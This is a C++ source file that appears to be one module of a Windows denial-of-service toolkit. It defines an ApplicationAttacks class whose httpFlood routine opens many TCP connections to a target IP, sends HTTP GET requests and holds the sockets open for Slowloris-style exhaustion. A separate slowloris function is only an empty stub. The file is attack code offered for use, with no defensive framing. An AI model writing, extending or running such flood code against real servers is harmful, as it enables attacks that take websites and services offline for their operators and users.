#include "application.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <random>

#pragma comment(lib, "ws2_32.lib")

void ApplicationAttacks::runAppLayerAttack(TargetConfig& url, AppParams& params) {
    if (url.protocol == "http" || url.protocol == "https") {
        httpFlood(url, params);
    } else if (params.connections > 0) {
        slowloris(url, params);
    }
}

void ApplicationAttacks::httpFlood(TargetConfig& url, AppParams& params) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    std::vector<SOCKET> sockets;
    std::atomic<int> requests_sent(0);
    
    for (int i = 0; i < params.connections; i++) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) continue;
        
        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        inet_pton(AF_INET, url.ip.c_str(), &server.sin_addr);
        
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
            sockets.push_back(sock);
            
            std::string request = "GET " + url.url + " HTTP/1.1\r\n"
                                 "Host: " + url.ip + "\r\n"
                                 "User-Agent: " + params.user_agent + "\r\n"
                                 "Accept: */*\r\n";
            
            if (params.keep_alive) {
                request += "Connection: keep-alive\r\n";
            }
            
            request += "\r\n";
            
            send(sock, request.c_str(), request.size(), 0);
            requests_sent++;
        }
    }
    
    // Keep connections open for Slowloris-like behavior
    if (params.keep_alive) {
        std::this_thread::sleep_for(std::chrono::seconds(60));
    }
    
    for (SOCKET sock : sockets) {
        closesocket(sock);
    }
    
    WSACleanup();
    std::cout << "HTTP Flood completed. Requests sent: " << requests_sent << std::endl;
}

void ApplicationAttacks::slowloris(TargetConfig& url, AppParams& params) {
    // Slowloris implementation
    // ...
}
